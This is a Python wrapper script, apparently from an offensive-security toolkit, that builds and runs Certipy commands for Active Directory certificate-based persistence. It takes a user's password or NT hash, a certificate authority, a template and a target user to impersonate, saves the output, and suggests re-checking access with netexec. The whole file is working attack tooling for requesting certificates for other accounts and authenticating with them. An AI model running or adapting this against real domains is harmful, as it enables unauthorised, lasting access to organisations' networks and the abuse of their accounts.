#!/usr/bin/env python3
"""Build and run Certipy persistence actions (find/request/auth) with JSON summaries.

Usage:
  python skills/persistence/scripts/cert_persist.py --action find -d corp.local -u alice -p Passw0rd! --dc-ip 10.0.0.10 -o ./certipy
"""

from __future__ import annotations

import argparse
import json
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Certipy wrapper for persistence workflows."
    )
    parser.add_argument("--action", choices=["find", "request", "auth"], required=True)
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--user", required=True)
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password")
    auth.add_argument("-H", "--hash", dest="nt_hash")
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument("--ca")
    parser.add_argument("--template")
    parser.add_argument("--target-user")
    parser.add_argument("-o", "--output", required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)
    output_file = output_dir / f"certipy_{args.action}.txt"
    tool = shutil.which("certipy")

    command = [
        tool or "certipy",
        args.action,
        "-u",
        f"{args.user}@{args.domain}",
        "-dc-ip",
        args.dc_ip,
    ]
    if args.password:
        command.extend(["-p", args.password])
    else:
        command.extend(["-hashes", args.nt_hash])
    if args.ca:
        command.extend(["-ca", args.ca])
    if args.template:
        command.extend(["-template", args.template])
    if args.target_user:
        command.extend(["-target", args.target_user])

    payload: dict[str, object] = {
        "action": args.action,
        "tool": tool or "certipy",
        "tool_found": bool(tool),
        "command": command,
        "output_file": str(output_file),
        "next_step": "If cert/key generated, run certipy auth and re-validate access with netexec.",
    }

    if not tool:
        print("[!] certipy not found. Printing command only.", file=sys.stderr)
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    output_file.write_text(
        f"{result.stdout}\n{result.stderr}".strip() + "\n", encoding="utf-8"
    )
    payload["return_code"] = result.returncode
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
